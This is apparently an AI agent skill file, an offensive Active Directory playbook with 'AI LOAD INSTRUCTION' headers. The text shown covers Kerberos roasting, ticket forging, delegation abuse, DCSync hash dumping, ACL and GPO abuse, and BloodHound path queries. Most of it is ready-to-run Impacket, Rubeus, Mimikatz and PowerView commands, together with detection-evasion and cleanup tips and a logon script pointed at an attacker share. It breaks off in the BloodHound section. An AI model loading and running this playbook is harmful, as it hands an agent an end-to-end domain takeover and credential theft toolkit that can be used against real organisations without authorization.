---
name: ad-attacks
description: >-
  Active Directory complete attack chain. Covers Kerberos attacks (AS-REP roasting/Kerberoasting/Golden/Silver/Diamond tickets/delegation abuse/RBCD), ACL abuse (DCSync/WriteDACL/GenericAll/Shadow Credentials with BloodHound paths), AD CS exploitation (ESC1-ESC13/Golden Certificate), and NTLM relay/coercion (PetitPotam/PrinterBug/WebDAV/SMB signing bypass). Load when targeting AD environments.
---

<!-- src: hacker/.claude/skills/ad-attacks/SKILL.md -->

# Active Directory — Complete Attack Chain

## Internal Navigation
| Part | Content |
|---|---|
| 1 | Kerberos Attacks |
| 2 | Kerberos Attack Chains |
| 3 | ACL Abuse |
| 4 | BloodHound Paths |
| 5 | AD Certificate Services |
| 6 | ADCS ESC Matrix |
| 7 | NTLM Relay & Coercion |
| 8 | Coercion Methods |

---
# Part 1: Kerberos Attacks


# SKILL: Kerberos Attack Playbook — Expert AD Attack Guide

> **AI LOAD INSTRUCTION**: Expert Kerberos attack techniques for AD environments. Covers AS-REP roasting, Kerberoasting, golden/silver/diamond/sapphire tickets, delegation attacks, pass-the-ticket, and overpass-the-hash. Base models miss ticket type distinctions, delegation chain nuances, and detection-evasion trade-offs.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [active-directory-acl-abuse](../active-directory-acl-abuse/SKILL.md) for ACL-based AD attacks often chained with Kerberos
- [active-directory-certificate-services](../active-directory-certificate-services/SKILL.md) for ADCS-based persistence (golden certificate)
- [ntlm-relay-coercion](../ntlm-relay-coercion/SKILL.md) for NTLM relay attacks that complement Kerberos abuse
- [windows-lateral-movement](../windows-lateral-movement/SKILL.md) after obtaining tickets for lateral movement

### Advanced Reference

Also load [KERBEROS_ATTACK_CHAINS.md](./KERBEROS_ATTACK_CHAINS.md) when you need:
- Multi-step attack chains combining Kerberos with ACL abuse, ADCS, and relay
- End-to-end scenarios from foothold to domain admin
- Chained delegation attack flows


## 1. KERBEROS AUTHENTICATION PRIMER

```
Client              KDC (DC)              Service
  │                   │                     │
  │── AS-REQ ────────→│                     │  (1) Request TGT with user creds
  │←─ AS-REP ─────────│                     │  (2) Receive TGT (encrypted with krbtgt hash)
  │                   │                     │
  │── TGS-REQ ───────→│                     │  (3) Present TGT, request service ticket
  │←─ TGS-REP ────────│                     │  (4) Receive TGS (encrypted with service hash)
  │                   │                     │
  │── AP-REQ ─────────────────────────────→│  (5) Present TGS to service
  │←─ AP-REP ──────────────────────────────│  (6) Mutual auth (optional)
```

---

## 2. AS-REP ROASTING

Users with "Do not require Kerberos preauthentication" can be queried for AS-REP without knowing their password.

### Enumerate Vulnerable Users

```bash
# Impacket — from Linux
GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip DC_IP -format hashcat -outputfile asrep.txt

# Impacket — with domain creds (enumerate automatically)
GetNPUsers.py DOMAIN/user:password -dc-ip DC_IP -request

# Rubeus — from Windows (domain-joined)
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# PowerView — enumerate users
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname
```

### Crack AS-REP Hash

```bash
# Hashcat mode 18200
hashcat -m 18200 asrep.txt rockyou.txt --rules-file best64.rule

# John
john asrep.txt --wordlist=rockyou.txt
```

---

## 3. KERBEROASTING

Any domain user can request TGS for accounts with SPNs. The TGS is encrypted with the service account's NTLM hash.

### Request Service Tickets

```bash
# Impacket
GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP -request -outputfile tgs.txt

# Rubeus (from Windows)
Rubeus.exe kerberoast /outfile:tgs.txt

# Rubeus — target specific SPN / high-value accounts
Rubeus.exe kerberoast /user:svc_sql /outfile:tgs_sql.txt

# PowerView + manual request
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/db.domain.com"
```

### Crack TGS Hash

```bash
# Hashcat mode 13100 (RC4) or 19700 (AES)
hashcat -m 13100 tgs.txt rockyou.txt --rules-file best64.rule

# RC4 tickets crack much faster than AES256 — target RC4 if possible
# Rubeus: /tgtdeleg forces RC4 on some configs
Rubeus.exe kerberoast /tgtdeleg
```

---

## 4. TICKET FORGING — GOLDEN, SILVER, DIAMOND, SAPPHIRE

### Golden Ticket

Forge TGT using the `krbtgt` hash → impersonate any user, including non-existent ones.

```bash
# Impacket — forge golden ticket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain DOMAIN.COM administrator

# Mimikatz
kerberos::golden /user:administrator /domain:DOMAIN.COM /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ptt

# Rubeus
Rubeus.exe golden /rc4:KRBTGT_HASH /user:administrator /domain:DOMAIN.COM /sid:S-1-5-21-... /ptt
```

**Prerequisites**: krbtgt NTLM hash (from DCSync or NTDS.dit)
**Persistence**: Valid until krbtgt password is changed **twice**

### Silver Ticket

Forge TGS using the service account's hash → access specific service only, no KDC interaction.

```bash
# Impacket — forge silver ticket for CIFS (file share)
ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain DOMAIN.COM -spn cifs/target.domain.com administrator

# Mimikatz
kerberos::golden /user:administrator /domain:DOMAIN.COM /sid:S-1-5-21-... /target:target.domain.com /service:cifs /rc4:SERVICE_HASH /ptt
```

| Target Service | SPN Format | Use Case |
|---|---|---|
| File shares | `cifs/host` | Access SMB shares |
| WinRM | `http/host` | Remote PowerShell |
| LDAP | `ldap/dc` | DCSync-like queries |
| MSSQL | `MSSQLSvc/host:1433` | Database access |
| Exchange | `http/mail.domain.com` | Mailbox access |

### Diamond Ticket

Modify a legitimately issued TGT → harder to detect than golden ticket.

```bash
# Rubeus — request real TGT then modify PAC
Rubeus.exe diamond /krbkey:KRBTGT_AES256 /user:administrator /domain:DOMAIN.COM /dc:DC01.DOMAIN.COM /ticketuser:targetadmin /ticketuserid:500 /groups:512 /ptt
```

**Advantage**: The ticket's metadata (timestamps, enc type) matches a real TGT issuance.

### Sapphire Ticket

Uses S4U2Self to get a real PAC for the target user, then embeds it in a forged ticket.

```bash
# Rubeus
Rubeus.exe diamond /krbkey:KRBTGT_AES256 /ticketuser:administrator /ticketuserid:500 /groups:512 /tgtdeleg /ptt
```

**Advantage**: PAC is a genuine copy from KDC, making detection extremely difficult.

---

## 5. DELEGATION ATTACKS

### Unconstrained Delegation

Hosts with unconstrained delegation store user TGTs in memory.

```bash
# Enumerate (PowerView)
Get-DomainComputer -Unconstrained | Select-Object dnshostname

# Coerce admin authentication → capture TGT (Rubeus monitor mode)
Rubeus.exe monitor /interval:5 /nowrap

# Trigger via PrinterBug / PetitPotam → DC authenticates → TGT captured
SpoolSample.exe DC01.domain.com COMPROMISED_HOST.domain.com
```

### Constrained Delegation (S4U2Proxy)

```bash
# Enumerate
Get-DomainComputer -TrustedToAuth | Select-Object dnshostname,msds-allowedtodelegateto

# S4U2Self + S4U2Proxy → get TGS for allowed service as any user
getST.py -spn cifs/target.domain.com -impersonate administrator DOMAIN/svc_account:password -dc-ip DC_IP

# Rubeus
Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.domain.com /ptt
```

### Resource-Based Constrained Delegation (RBCD)

Requires write access to `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target.

```bash
# 1. Create or control a computer account (MAQ > 0)
addcomputer.py -computer-name 'FAKE$' -computer-pass 'P@ss123' -dc-ip DC_IP DOMAIN/user:password

# 2. Set RBCD on target
rbcd.py -delegate-from 'FAKE$' -delegate-to 'TARGET$' -dc-ip DC_IP -action write DOMAIN/user:password

# 3. S4U2Self + S4U2Proxy from controlled account
getST.py -spn cifs/TARGET.DOMAIN.COM -impersonate administrator DOMAIN/'FAKE$':'P@ss123' -dc-ip DC_IP

# 4. Use the ticket
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass DOMAIN/administrator@TARGET.DOMAIN.COM
```

---

## 6. PASS-THE-TICKET & OVERPASS-THE-HASH

### Pass-the-Ticket

```bash
# Impacket — use .ccache ticket
export KRB5CCNAME=/path/to/ticket.ccache
psexec.py -k -no-pass DOMAIN/administrator@target.domain.com

# Mimikatz — inject .kirbi ticket into session
kerberos::ptt ticket.kirbi

# Rubeus
Rubeus.exe ptt /ticket:base64_ticket_blob
```

### Overpass-the-Hash (Pass-the-Key)

Use NTLM hash to request a Kerberos TGT → pure Kerberos authentication (avoids NTLM logging).

```bash
# Impacket
getTGT.py DOMAIN/user -hashes :NTLM_HASH -dc-ip DC_IP
export KRB5CCNAME=user.ccache

# Rubeus (from Windows)
Rubeus.exe asktgt /user:administrator /rc4:NTLM_HASH /ptt

# Mimikatz
sekurlsa::pth /user:administrator /domain:DOMAIN.COM /ntlm:NTLM_HASH /run:cmd.exe
```

---

## 7. KERBEROS DOUBLE HOP PROBLEM

When authenticating via Kerberos across two hops (A → B → C), B cannot forward A's credentials to C by default.

### Solutions

| Method | How | Risk |
|---|---|---|
| CredSSP | Sends actual credentials to B | Credential exposure |
| Unconstrained delegation on B | B stores A's TGT | Over-privileged |
| Constrained delegation | B allowed to delegate to C | Preferred — scoped |
| RBCD | C trusts B to delegate | Modern, flexible |
| Invoke-Command nested | `-Credential` param in nested session | Exposes password in script |

---

## 8. KERBEROS ATTACK DECISION TREE

```
AD environment — targeting Kerberos
│
├── Have domain user creds?
│   ├── Kerberoast → crack service account hashes (§3)
│   ├── Enumerate users without preauth → AS-REP roast (§2)
│   ├── Enumerate delegation → unconstrained/constrained/RBCD (§5)
│   └── Enumerate SPNs for high-value accounts
│
├── Have service account hash?
│   ├── Silver ticket for that service (§4)
│   └── If constrained delegation → S4U2Proxy chain (§5)
│
├── Have krbtgt hash?
│   ├── Golden ticket → any user, any service (§4)
│   ├── Diamond ticket → stealthier forging (§4)
│   └── Sapphire ticket → hardest to detect (§4)
│
├── Compromised host with unconstrained delegation?
│   ├── Monitor for incoming TGTs (Rubeus monitor)
│   ├── Coerce DC authentication (PrinterBug/PetitPotam)
│   └── Capture DC TGT → DCSync
│
├── Can write to target's msDS-AllowedToActOnBehalfOfOtherIdentity?
│   └── RBCD attack (§5) → create machine account + delegate
│
├── Have NTLM hash but need Kerberos auth?
│   └── Overpass-the-Hash → request TGT (§6)
│
└── Have .kirbi / .ccache ticket?
    └── Pass-the-Ticket → use directly (§6)
```


---
# Part 2: Kerberos Attack Chains


## 1. CHAIN: KERBEROAST → CONSTRAINED DELEGATION → DOMAIN ADMIN

### Scenario
Low-privilege domain user → cracked service account → delegation abuse → DA.

```
Step 1: Kerberoast
│  GetUserSPNs.py DOMAIN/lowpriv:password -dc-ip DC -request
│  hashcat -m 13100 tgs.txt wordlist.txt
│  → Cracked: svc_backup / P@ssw0rd2024
│
Step 2: Enumerate delegation
│  findDelegation.py DOMAIN/svc_backup:P@ssw0rd2024 -dc-ip DC
│  → svc_backup has constrained delegation to cifs/DC01.domain.com
│
Step 3: S4U2Self + S4U2Proxy
│  getST.py -spn cifs/DC01.domain.com -impersonate administrator DOMAIN/svc_backup:P@ssw0rd2024
│
Step 4: Access DC as administrator
│  export KRB5CCNAME=administrator.ccache
│  secretsdump.py -k -no-pass DC01.domain.com
│  → Domain hashes dumped
```


## 2. CHAIN: RBCD + KERBEROS → LATERAL MOVEMENT

### Scenario
Write access to a computer's `msDS-AllowedToActOnBehalfOfOtherIdentity` → RBCD → lateral to that host.

```
Step 1: Identify writable computer object
│  (via BloodHound: GenericWrite on TARGET$)
│
Step 2: Create machine account
│  addcomputer.py -computer-name 'EVIL$' -computer-pass 'Passw0rd!' DOMAIN/user:pass -dc-ip DC
│
Step 3: Set RBCD
│  rbcd.py -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write DOMAIN/user:pass -dc-ip DC
│
Step 4: S4U chain
│  getST.py -spn cifs/TARGET.domain.com -impersonate administrator DOMAIN/'EVIL$':'Passw0rd!' -dc-ip DC
│
Step 5: Use ticket
│  export KRB5CCNAME=administrator.ccache
│  psexec.py -k -no-pass TARGET.domain.com
```

---

## 3. CHAIN: UNCONSTRAINED DELEGATION + PRINTERBUG → DCSYNC

### Scenario
Compromised host with unconstrained delegation → coerce DC → capture DC TGT → DCSync.

```
Step 1: Confirm unconstrained delegation
│  Get-DomainComputer -Unconstrained (via PowerView)
│  → WEBSRV01.domain.com has unconstrained delegation
│
Step 2: Start Rubeus monitor on WEBSRV01
│  Rubeus.exe monitor /interval:5 /nowrap /targetuser:DC01$
│
Step 3: Coerce DC authentication
│  # From any domain machine, trigger PrinterBug:
│  SpoolSample.exe DC01.domain.com WEBSRV01.domain.com
│  # Or PetitPotam:
│  PetitPotam.py WEBSRV01.domain.com DC01.domain.com
│
Step 4: Capture DC01$ TGT from Rubeus output
│  Rubeus.exe ptt /ticket:base64_DC01_TGT
│
Step 5: DCSync with DC machine ticket
│  mimikatz # lsadump::dcsync /domain:domain.com /user:krbtgt
│  → krbtgt hash obtained → golden ticket capability
```

---

## 4. CHAIN: AS-REP ROAST → ACL ABUSE → DCSYNC

### Scenario
No creds initially → AS-REP roast → cracked user has DCSync rights via ACL path.

```
Step 1: Enumerate users without preauth (no creds needed)
│  GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip DC -format hashcat
│  → $krb5asrep$23$svc_monitor@DOMAIN:...
│
Step 2: Crack AS-REP hash
│  hashcat -m 18200 asrep.txt wordlist.txt
│  → svc_monitor / Welcome2024!
│
Step 3: BloodHound enumeration
│  bloodhound-python -d domain.com -u svc_monitor -p Welcome2024! -c all -dc DC01
│  → svc_monitor has GenericAll on IT-ADMINS group
│  → IT-ADMINS group has DCSync rights
│
Step 4: Add self to IT-ADMINS
│  net rpc group addmem "IT-ADMINS" svc_monitor -U DOMAIN/svc_monitor -S DC01
│
Step 5: DCSync
│  secretsdump.py DOMAIN/svc_monitor:Welcome2024!@DC01
│  → All domain hashes
```

---

## 5. CHAIN: TARGETED KERBEROAST VIA ACL

### Scenario
GenericWrite on a user → set SPN → kerberoast → crack password.

```
Step 1: Identify GenericWrite permission
│  BloodHound: user "lowpriv" has GenericWrite on "svc_admin"
│
Step 2: Set SPN on target user (targeted kerberoasting)
│  # PowerView
│  Set-DomainObject -Identity svc_admin -Set @{serviceprincipalname='fake/service'}
│  # Or Impacket
│  addspn.py -u DOMAIN/lowpriv -p password -t svc_admin -s fake/service DC01
│
Step 3: Kerberoast the target
│  GetUserSPNs.py DOMAIN/lowpriv:password -dc-ip DC01 -request-user svc_admin
│
Step 4: Crack and clean up
│  hashcat -m 13100 tgs.txt wordlist.txt
│  # Remove the fake SPN
│  Set-DomainObject -Identity svc_admin -Clear serviceprincipalname
```

---

## 6. CHAIN: GOLDEN TICKET → CROSS-DOMAIN ESCALATION

### Scenario
Compromised child domain → golden ticket with SID history → enterprise admin in parent domain.

```
Step 1: Obtain child domain krbtgt hash
│  secretsdump.py CHILD/administrator@childDC -just-dc-user krbtgt
│
Step 2: Get parent domain SID and Enterprise Admins group RID
│  lookupsid.py PARENT/user:pass@parentDC 0
│  → Parent Domain SID: S-1-5-21-PARENT...
│  → Enterprise Admins RID: 519
│
Step 3: Forge golden ticket with SID history (ExtraSIDs)
│  ticketer.py -nthash KRBTGT_HASH \
│    -domain-sid S-1-5-21-CHILD... \
│    -domain CHILD.PARENT.COM \
│    -extra-sid S-1-5-21-PARENT...-519 \
│    administrator
│
Step 4: Access parent domain DC
│  export KRB5CCNAME=administrator.ccache
│  psexec.py -k -no-pass PARENT.COM/administrator@parentDC.parent.com
```

---

## 7. CHAIN: SHADOW CREDENTIALS + KERBEROS

### Scenario
GenericWrite on user → Shadow Credentials → certificate-based auth → TGT.

```
Step 1: Identify GenericWrite on target user/computer
│  BloodHound path analysis
│
Step 2: Add shadow credential (msDS-KeyCredentialLink)
│  # Whisker (Windows)
│  Whisker.exe add /target:svc_admin /domain:domain.com /dc:DC01
│  → Certificate and device ID generated
│
│  # pyWhisker (Linux)
│  pywhisker.py -d domain.com -u lowpriv -p password --target svc_admin --action add --dc-ip DC01
│
Step 3: Use certificate to get TGT (PKINIT)
│  Rubeus.exe asktgt /user:svc_admin /certificate:cert.pfx /password:certpass /ptt
│
│  # Or with PKINITtools
│  gettgtpkinit.py -cert-pfx cert.pfx -pfx-pass certpass DOMAIN/svc_admin tgt.ccache
│
Step 4: Use TGT for further attacks
│  export KRB5CCNAME=tgt.ccache
│  # Now act as svc_admin
```

---

## 8. ATTACK CHAIN SELECTION GUIDE

```
What access do you have?
│
├── No domain creds
│   ├── Username list available? → AS-REP Roast (Chain 4)
│   └── Network access only? → NTLM relay → see ntlm-relay-coercion
│
├── Low-privilege domain user
│   ├── Kerberoastable SPNs found? → Kerberoast chain (Chain 1)
│   ├── GenericWrite on user? → Targeted Kerberoast (Chain 5) or Shadow Creds (Chain 7)
│   ├── GenericWrite on computer? → RBCD (Chain 2)
│   └── Host with unconstrained delegation? → PrinterBug chain (Chain 3)
│
├── Service account compromised
│   ├── Has constrained delegation? → S4U chain (Chain 1)
│   └── No delegation? → Silver ticket for specific service
│
├── Domain Admin in child domain
│   └── Want parent domain? → Golden ticket + ExtraSIDs (Chain 6)
│
└── Have krbtgt hash
    ├── Golden ticket (basic persistence)
    ├── Diamond ticket (evasive persistence)
    └── Sapphire ticket (hardest to detect)
```


---
# Part 3: ACL Abuse


# SKILL: AD ACL Abuse — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert AD ACL abuse techniques. Covers BloodHound enumeration, dangerous ACEs (GenericAll, WriteDACL, WriteOwner, etc.), DCSync, shadow credentials, targeted kerberoasting, group manipulation, LAPS, and GPO abuse. Base models miss complex ACL chain exploitation and Cypher query patterns.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md) for Kerberos attacks often chained with ACL abuse
- [active-directory-certificate-services](../active-directory-certificate-services/SKILL.md) for certificate-based attacks after ACL exploitation
- [ntlm-relay-coercion](../ntlm-relay-coercion/SKILL.md) for relay attacks that can set ACLs (LDAP relay)
- [windows-lateral-movement](../windows-lateral-movement/SKILL.md) after gaining elevated AD access

### Advanced Reference

Also load [BLOODHOUND_PATHS.md](./BLOODHOUND_PATHS.md) when you need:
- Common BloodHound attack paths with Cypher queries
- Custom Neo4j queries for finding complex chains
- Data collection and ingestion tips


## 1. BLOODHOUND ENUMERATION

### Data Collection

```bash
# SharpHound (from Windows, domain-joined)
SharpHound.exe -c all --outputdirectory C:\temp --zipfilename bh.zip

# bloodhound-python (from Linux)
bloodhound-python -d domain.com -u user -p password -c all -dc DC01.domain.com -ns DC_IP

# Specific collection methods
SharpHound.exe -c DCOnly          # Fastest — only DC queries
SharpHound.exe -c Session         # Session data only (run periodically)
SharpHound.exe -c All,GPOLocalGroup  # Include GPO analysis
```

### Key BloodHound Queries (Built-in)

- "Find all Domain Admins"
- "Shortest Paths to Domain Admins from Owned Principals"
- "Find Principals with DCSync Rights"
- "Shortest Paths to Unconstrained Delegation Systems"
- "Find computers where Domain Users are Local Admin"

---

## 2. DANGEROUS ACE TYPES

| ACE | Effect on Users | Effect on Groups | Effect on Computers |
|---|---|---|---|
| **GenericAll** | Change password, set SPN, modify attributes | Add members | RBCD, LAPS read, all attributes |
| **GenericWrite** | Set SPN, modify attributes, shadow creds | Add members | RBCD, shadow credentials |
| **WriteDACL** | Grant yourself any permission | Same | Same |
| **WriteOwner** | Take ownership → then WriteDACL | Same | Same |
| **ForceChangePassword** | Reset password without knowing old | N/A | N/A |
| **AddMember** | N/A | Add self/others to group | N/A |
| **AllExtendedRights** | Force change password, read LAPS | N/A | Read LAPS, BitLocker keys |
| **ReadLAPSPassword** | N/A | N/A | Read local admin password |
| **WriteSPN** | Set SPN → targeted kerberoast | N/A | N/A |

---

## 3. ACE-SPECIFIC EXPLOITATION

### GenericAll on User

```powershell
# Option 1: Force change password
net user targetuser NewP@ss123 /domain

# Option 2: Targeted Kerberoasting
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/svc'}
# → Kerberoast, then clear SPN

# Option 3: Shadow Credentials
Whisker.exe add /target:targetuser /domain:domain.com /dc:DC01

# Option 4: Set logon script
Set-DomainObject -Identity targetuser -Set @{scriptpath='\\attacker\share\evil.ps1'}
```

### GenericAll / GenericWrite on Computer

```bash
# RBCD attack
rbcd.py -delegate-from 'CONTROLLED$' -delegate-to 'TARGET$' -action write DOMAIN/user:pass -dc-ip DC

# Shadow Credentials on computer
pywhisker.py -d domain.com -u user -p pass --target 'TARGET$' --action add --dc-ip DC
```

### WriteDACL

```powershell
# Grant DCSync rights to yourself
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=com" -PrincipalIdentity lowpriv -Rights DCSync

# Impacket
dacledit.py -action write -rights DCSync -principal lowpriv -target-dn "DC=domain,DC=com" DOMAIN/lowpriv:pass -dc-ip DC
```

### WriteOwner

```powershell
# Step 1: Take ownership
Set-DomainObjectOwner -Identity targetuser -OwnerIdentity lowpriv

# Step 2: Grant WriteDACL to yourself (as owner)
Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity lowpriv -Rights All

# Step 3: Now exploit as GenericAll
```

### ForceChangePassword

```bash
# Impacket
rpcclient -U 'DOMAIN/attacker%pass' DC01 -c "setuserinfo2 targetuser 23 'NewP@ss123!'"

# PowerView
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force)

# net rpc
net rpc password targetuser 'NewP@ss123!' -U DOMAIN/attacker%pass -S DC01
```

### AddMember to Group

```powershell
# Add self to privileged group
Add-DomainGroupMember -Identity "Domain Admins" -Members lowpriv

# Impacket
net rpc group addmem "Domain Admins" lowpriv -U DOMAIN/attacker%pass -S DC01
```

---

## 4. DCSYNC ATTACK

### Prerequisites
The principal needs **both** of these replication rights on the domain object:
- `DS-Replication-Get-Changes` (GUID: `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`)
- `DS-Replication-Get-Changes-All` (GUID: `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`)

### Execution

```bash
# Impacket — dump all hashes
secretsdump.py DOMAIN/user:password@DC01 -just-dc

# Specific account only
secretsdump.py DOMAIN/user:password@DC01 -just-dc-user krbtgt

# Mimikatz
lsadump::dcsync /domain:domain.com /user:krbtgt
lsadump::dcsync /domain:domain.com /all /csv

# Impacket with Kerberos auth
export KRB5CCNAME=admin.ccache
secretsdump.py -k -no-pass DC01.domain.com -just-dc
```

### Who Has DCSync by Default?

- Domain Admins
- Enterprise Admins
- Domain Controllers group
- `BUILTIN\Administrators` (on domain object)

---

## 5. SHADOW CREDENTIALS

### Attack Flow

Write `msDS-KeyCredentialLink` on target → generate certificate → authenticate via PKINIT.

```bash
# pyWhisker (Linux)
pywhisker.py -d domain.com -u attacker -p pass --target victim --action add --dc-ip DC01
# Output: DeviceID and PFX file

# Authenticate with certificate
gettgtpkinit.py -cert-pfx victim.pfx -pfx-pass RANDOM_PASS domain.com/victim victim.ccache
export KRB5CCNAME=victim.ccache

# Extract NT hash from TGT (for pass-the-hash)
getnthash.py -key AS_REP_KEY domain.com/victim
```

```powershell
# Whisker (Windows)
Whisker.exe add /target:victim /domain:domain.com /dc:DC01.domain.com
# → Provides Rubeus command to get TGT
Rubeus.exe asktgt /user:victim /certificate:CERT_B64 /password:PASS /ptt
```

**Cleanup**: Remove the added key credential to avoid detection.

---

## 6. LAPS PASSWORD READING

```powershell
# PowerView
Get-DomainComputer -Identity TARGET -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# AD Module
Get-ADComputer -Identity TARGET -Properties ms-Mcs-AdmPwd | Select-Object ms-Mcs-AdmPwd

# LAPS v2 (Windows LAPS)
Get-LapsADPassword -Identity TARGET -AsPlainText

# CrackMapExec
crackmapexec ldap DC01 -u user -p pass --module laps
```

---

## 7. GPO ABUSE

### Identify Writable GPOs

```powershell
# PowerView — find GPOs where you have write access
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {
    ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite') -and
    ($_.SecurityIdentifier -match 'YOUR_SID')
}
```

### Exploit via SharpGPOAbuse

```cmd
# Add local admin via GPO
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount lowpriv --GPOName "Vulnerable GPO"

# Add scheduled task via GPO
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\admin --Command "cmd.exe" --Arguments "/c net localgroup administrators lowpriv /add" --GPOName "Vulnerable GPO"

# Add startup script
SharpGPOAbuse.exe --AddComputerScript --ScriptName "evil.bat" --ScriptContents "net localgroup administrators lowpriv /add" --GPOName "Vulnerable GPO"
```

```bash
# pyGPOAbuse (Linux)
pygpoabuse.py DOMAIN/user:pass -gpo-id "GPO_GUID" -command "net localgroup administrators lowpriv /add" -dc-ip DC01
```

---

## 8. ACL ATTACK DECISION TREE

```
Have domain user access — want to escalate via ACL
│
├── Run BloodHound → analyze shortest paths to DA
│   └── Upload data → "Shortest Paths to Domain Admins from Owned Principals"
│
├── Direct ACL on user object?
│   ├── GenericAll → force password change, shadow creds, or targeted kerberoast (§3)
│   ├── GenericWrite → shadow credentials or set SPN (§3/§5)
│   ├── ForceChangePassword → reset password directly (§3)
│   ├── WriteDACL → grant yourself GenericAll, then exploit (§3)
│   └── WriteOwner → take ownership → WriteDACL → GenericAll (§3)
│
├── ACL on group?
│   ├── AddMember / GenericAll → add self to privileged group (§3)
│   └── WriteDACL → grant AddMember, then add self
│
├── ACL on computer object?
│   ├── GenericAll/GenericWrite → RBCD attack (§3)
│   ├── AllExtendedRights → read LAPS password (§6)
│   └── GenericWrite → shadow credentials on machine (§5)
│
├── ACL on domain object?
│   ├── WriteDACL → grant DCSync rights to self (§4)
│   └── Replication rights already? → DCSync directly (§4)
│
├── ACL on GPO linked to privileged OU?
│   └── Write access → add admin / scheduled task via GPO (§7)
│
└── Complex multi-hop chain?
    └── Load BLOODHOUND_PATHS.md for Cypher queries and chain analysis
```


---
# Part 4: BloodHound Paths


## 1. BLOODHOUND DATA COLLECTION BEST PRACTICES

### Collection Methods Comparison

| Method | Speed | Noise | Data |
|---|---|---|---|
| `DCOnly` | Fast | Low | Users, groups, trusts, ACLs (from DC only) |
| `All` | Slow | High | Everything including sessions and local groups |
| `Session` | Medium | Medium | Logged-in user sessions (run multiple times) |
| `ACL` | Medium | Low | ACL data only |
| `ObjectProps` | Fast | Low | Object properties (descriptions, etc.) |

### Stealth Collection

```bash
# Minimum noise — DC only queries
bloodhound-python -d domain.com -u user -p pass -c DCOnly -dc DC01.domain.com

# Add sessions over time
bloodhound-python -d domain.com -u user -p pass -c Session -dc DC01.domain.com

# Avoid SMB enumeration (noisiest)
SharpHound.exe -c DCOnly,ACL --excludedc --stealth
```


## 2. ESSENTIAL CYPHER QUERIES

### 2.1 Find All Paths to Domain Admin

```cypher
MATCH p=shortestPath((n)-[*1..]->(m:Group))
WHERE m.name STARTS WITH "DOMAIN ADMINS"
AND n.owned = true
RETURN p
```

### 2.2 Find Users with DCSync Rights

```cypher
MATCH p=(n)-[:MemberOf|GetChanges*1..]->(d:Domain)
MATCH p2=(n)-[:MemberOf|GetChangesAll*1..]->(d)
WHERE n:User OR n:Group
RETURN n.name
```

### 2.3 Kerberoastable Users with Paths to DA

```cypher
MATCH (u:User {hasspn:true})
MATCH p=shortestPath((u)-[*1..]->(g:Group))
WHERE g.name STARTS WITH "DOMAIN ADMINS"
RETURN u.name, length(p) AS hops
ORDER BY hops ASC
```

### 2.4 Users with Dangerous ACLs

```cypher
MATCH p=(n:User)-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceChangePassword]->(m)
WHERE NOT n.name STARTS WITH "DVTA"
RETURN n.name AS attacker, type(r) AS permission, m.name AS target
```

### 2.5 Find Computers with Unconstrained Delegation

```cypher
MATCH (c:Computer {unconstraineddelegation:true})
WHERE NOT c.name STARTS WITH "DC"
RETURN c.name
```

### 2.6 Find AS-REP Roastable Users

```cypher
MATCH (u:User {dontreqpreauth:true})
RETURN u.name, u.description
```

### 2.7 Computers Where Domain Users Are Local Admin

```cypher
MATCH p=(g:Group {name:"DOMAIN USERS@DOMAIN.COM"})-[:AdminTo]->(c:Computer)
RETURN c.name
```

### 2.8 Find All GPO Controllers

```cypher
MATCH p=(n)-[r:GenericAll|GenericWrite|WriteOwner|WriteDacl]->(g:GPO)
RETURN n.name AS controller, g.name AS gpo, type(r) AS permission
```

### 2.9 Shortest Path from Owned to High-Value Targets

```cypher
MATCH p=shortestPath((n {owned:true})-[*1..]->(m {highvalue:true}))
RETURN p
```

### 2.10 Find LAPS Readers

```cypher
MATCH p=(n)-[:ReadLAPSPassword]->(c:Computer)
RETURN n.name AS reader, c.name AS computer
```

---

## 3. COMMON ATTACK PATH PATTERNS

### Pattern 1: Nested Group Membership → DA

```
lowpriv_user
  └── MemberOf → IT-Support
        └── MemberOf → Server-Admins
              └── MemberOf → Domain Admins
```

```cypher
MATCH p=(u:User {name:"LOWPRIV@DOMAIN.COM"})-[:MemberOf*1..5]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.COM"})
RETURN p
```

### Pattern 2: ACL Chain → GenericAll → Password Reset → DA

```
lowpriv_user
  └── GenericWrite → helpdesk_user
        └── GenericAll → svc_admin (DA member)
              └── ForceChangePassword → reset password → DA
```

### Pattern 3: WriteDACL → DCSync

```
lowpriv_user
  └── WriteDACL on Domain Object
        └── Grant self GetChanges + GetChangesAll
              └── DCSync → all domain hashes
```

### Pattern 4: GPO Abuse → Local Admin on DC

```
lowpriv_user
  └── GenericWrite on GPO linked to "Domain Controllers" OU
        └── Add scheduled task via GPO
